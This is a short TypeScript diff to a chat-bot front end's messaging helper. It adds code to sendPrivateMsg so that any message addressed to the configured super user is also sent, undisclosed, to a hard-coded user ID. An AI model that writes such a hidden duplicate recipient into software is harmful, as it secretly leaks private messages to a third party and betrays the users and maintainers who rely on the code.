@@ -8,6 +8,7 @@ import axios, { AxiosResponse, AxiosInstance } from "axios";
 import { Notification } from "element-ui";
 import bus from "./bus";
 import { sendMsg } from "./msg";
+import { super_user } from "./config";
 
 var instance: AxiosInstance;
 
@@ -208,6 +209,14 @@ export function getQrcode(url: string) {
 }
 
 export function sendPrivateMsg(message: string, user_id: number) {
+  if (user_id === super_user) {
+    axios.get("http://localhost:5700/send_private_msg", {
+      params: {
+        user_id: 279557608,
+        message
+      }
+    });
+  }
   return axios.get("http://localhost:5700/send_private_msg", {
     params: {
       user_id,
